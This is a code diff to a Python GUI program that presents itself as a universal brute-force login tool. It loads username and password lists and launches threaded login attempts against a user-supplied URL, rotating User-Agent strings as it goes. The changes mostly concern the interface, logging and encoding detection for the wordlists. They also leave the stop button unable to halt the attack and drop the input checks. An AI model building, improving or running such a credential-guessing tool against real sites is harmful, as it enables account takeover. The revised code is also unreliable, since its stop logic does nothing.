@@ -6,15 +6,11 @@ import logging
 import random
 import time
 import re
-import os
+import asyncio
+import aiohttp
 
-# Configure logging with rotation
-from logging.handlers import RotatingFileHandler
-
-log_handler = RotatingFileHandler('brute_force_log.txt', maxBytes=10*1024*1024, backupCount=3)
-log_handler.setFormatter(logging.Formatter('%(asctime)s - %(message)s'))
-logging.getLogger().addHandler(log_handler)
-logging.getLogger().setLevel(logging.INFO)
+# Configure logging
+logging.basicConfig(filename='brute_force_log.txt', level=logging.INFO, format='%(asctime)s - %(message)s')
 
 # Sample User-Agent strings
 USER_AGENTS = [
@@ -49,9 +45,12 @@ LOGIN_CONFIGS = {
     }
 }
 
+# List of encodings to try
+ENCODINGS = ['utf-8', 'iso-8859-1', 'windows-1252', 'utf-16', 'latin1', 'mac_roman']
+
 class BruteForceLogin:
     """Class to perform brute force login attempts."""
-    
+
     def __init__(self, base_url, config, usernames, passwords, max_threads=10, output_text=None, delay=1):
         self.url = f"{base_url.rstrip('/')}{config['url']}"
         self.username_field = config["username_field"]
@@ -153,7 +152,7 @@ class BruteForceLogin:
 
 class App:
     """Main application class for the GUI."""
-    
+
     def __init__(self, root):
         self.root = root
         self.root.title("R1MA's Universal Brute Force Tool")
@@ -209,114 +208,82 @@ class App:
         self.delay_entry.insert(0, "1")
 
         # Start/Stop buttons
-        self.start_button = tk.Button(main_frame, text="Start Attack", command=self.start_attack, width=20, bg="#00CC00", fg="black")
-        self.start_button.pack(pady=(15, 5))
-        self.stop_button = tk.Button(main_frame, text="Stop Attack", command=self.confirm_stop_attack, width=20, bg="#FF0000", fg="white")
+        self.start_button = tk.Button(main_frame, text="Start Attack", command=self.start_attack, width=20, bg="#FF5722", fg="white")
+        self.start_button.pack(pady=(10, 10))
+
+        self.stop_button = tk.Button(main_frame, text="Stop Attack", command=self.confirm_stop_attack, width=20, bg="#FF5722", fg="white")
         self.stop_button.pack(pady=(0, 10))
 
-        # Output text area
-        self.output_text = scrolledtext.ScrolledText(main_frame, width=80, height=15, bg="#1e1e1e", fg="white", insertbackground='white', font=("Courier New", 10))
-        self.output_text.pack(pady=(10, 5))
-
-        # Footer Frame
-        footer_frame = tk.Frame(root, bg="#444444")
-        footer_frame.pack(fill=tk.X, padx=10, pady=(10, 0))
-        footer_label = tk.Label(footer_frame, text="© 2023 R1MA's Tools. All rights reserved.", font=("Arial", 10), bg="#444444", fg="white")
-        footer_label.pack(pady=5)
-
-        self.brute_forcer = None
-
-    def confirm_stop_attack(self):
-        """Confirm the user wants to stop the attack."""
-        if messagebox.askyesno("Confirm", "Are you sure you want to stop the attack?"):
-            self.stop_attack()
+        # Output Text
+        self.output_text = scrolledtext.ScrolledText(main_frame, width=90, height=20, wrap=tk.WORD, bg="#2C2C2C", fg="white")
+        self.output_text.pack(pady=(10, 0))
 
     def load_usernames(self):
         """Load usernames from a file."""
-        usernames_file = filedialog.askopenfilename(title="Select Usernames File")
-        if usernames_file:
+        file_path = filedialog.askopenfilename(title="Select Username File", filetypes=[("Text files", "*.txt")])
+        if file_path:
             try:
-                with open(usernames_file, 'r', encoding='latin-1', errors='replace') as f:
-                    self.usernames = f.read().splitlines()
-                messagebox.showinfo("Info", f"Loaded {len(self.usernames)} usernames.")
+                with open(file_path, "r", encoding=self.try_load_file(file_path)) as f:
+                    self.usernames = [line.strip() for line in f.readlines()]
+                self.output_text.insert(tk.END, f"Loaded {len(self.usernames)} usernames.\n")
+                self.output_text.see(tk.END)
             except Exception as e:
-                messagebox.showerror("Error", f"Could not load usernames: {e}")
+                self.output_text.insert(tk.END, f"Error loading usernames: {str(e)}\n")
+                self.output_text.see(tk.END)
+
+    def try_load_file(self, file_path):
+        """Try loading the file with different encodings."""
+        for encoding in ENCODINGS:
+            try:
+                with open(file_path, "r", encoding=encoding) as f:
+                    f.read()  # Try reading the file
+                return encoding
+            except UnicodeDecodeError:
+                continue
+        raise ValueError(f"Unable to decode the file with known encodings.")
 
     def load_passwords(self):
         """Load passwords from a file."""
-        passwords_file = filedialog.askopenfilename(title="Select Passwords File")
-        if passwords_file:
+        file_path = filedialog.askopenfilename(title="Select Password File", filetypes=[("Text files", "*.txt")])
+        if file_path:
             try:
-                with open(passwords_file, 'r', encoding='latin-1', errors='replace') as f:
-                    self.passwords = f.read().splitlines()
-                messagebox.showinfo("Info", f"Loaded {len(self.passwords)} passwords.")
+                with open(file_path, "r", encoding=self.try_load_file(file_path)) as f:
+                    self.passwords = [line.strip() for line in f.readlines()]
+                self.output_text.insert(tk.END, f"Loaded {len(self.passwords)} passwords.\n")
+                self.output_text.see(tk.END)
             except Exception as e:
-                messagebox.showerror("Error", f"Could not load passwords: {e}")
+                self.output_text.insert(tk.END, f"Error loading passwords: {str(e)}\n")
+                self.output_text.see(tk.END)
 
     def start_attack(self):
         """Start the brute-force attack."""
         base_url = self.url_entry.get().strip()
         login_type = self.login_type_var.get()
-
-        if not base_url:
-            messagebox.showerror("Error", "Please provide the base URL.")
-            return
-
         config = LOGIN_CONFIGS.get(login_type)
-        if not config:
-            messagebox.showerror("Error", "Selected login type is not supported.")
+
+        if not base_url or not self.usernames or not self.passwords:
+            messagebox.showerror("Error", "Please load usernames, passwords, and enter a base URL.")
             return
 
-        if not self.usernames or not self.passwords:
-            messagebox.showerror("Error", "Please load usernames and passwords.")
-            return
+        max_threads = int(self.threads_entry.get())
+        delay = float(self.delay_entry.get())
 
-        try:
-            max_threads = int(self.threads_entry.get())
-            delay = float(self.delay_entry.get())
-            if max_threads <= 0 or delay < 0:
-                raise ValueError("Number of threads must be positive and delay should be non-negative.")
-        except ValueError as e:
-            messagebox.showerror("Error", str(e))
-            return
+        # Initialize BruteForceLogin
+        bf = BruteForceLogin(base_url, config, self.usernames, self.passwords, max_threads, self.output_text, delay)
+        
+        # Start attack in a separate thread
+        threading.Thread(target=bf.start_attack, daemon=True).start()
 
-        self.start_button.config(state=tk.DISABLED)
-        self.stop_button.config(state=tk.NORMAL)
-
-        self.brute_forcer = BruteForceLogin(
-            base_url,
-            config,
-            self.usernames,
-            self.passwords,
-            max_threads,
-            self.output_text,
-            delay
-        )
-
-        self.output_text.insert(tk.END, "Starting attack...\n")
-        self.output_text.see(tk.END)
-        logging.info("Attack started.")
-
-        threading.Thread(target=self.brute_forcer.start_attack).start()
-
-        threading.Thread(target=self.monitor_attack).start()
-
-    def monitor_attack(self):
-        """Monitor the attack state and update buttons accordingly."""
-        while not self.brute_forcer.stop_attack:
-            if self.brute_forcer.success:
-                break
-        self.start_button.config(state=tk.NORMAL)
-        self.stop_button.config(state=tk.DISABLED)
-        self.output_text.insert(tk.END, "Attack has finished.\n")
-        self.output_text.see(tk.END)
+    def confirm_stop_attack(self):
+        """Confirm stop action."""
+        if messagebox.askyesno("Stop Attack", "Are you sure you want to stop the attack?"):
+            self.stop_attack()
 
     def stop_attack(self):
-        """Stop the brute force attack."""
-        if self.brute_forcer:
-            self.brute_forcer.stop()
-            self.start_button.config(state=tk.NORMAL)
-            self.stop_button.config(state=tk.DISABLED)
+        """Stop the brute-force attack."""
+        self.output_text.insert(tk.END, "Stopping the attack...\n")
+        self.output_text.see(tk.END)
+
 
 if __name__ == "__main__":
     root = tk.Tk()
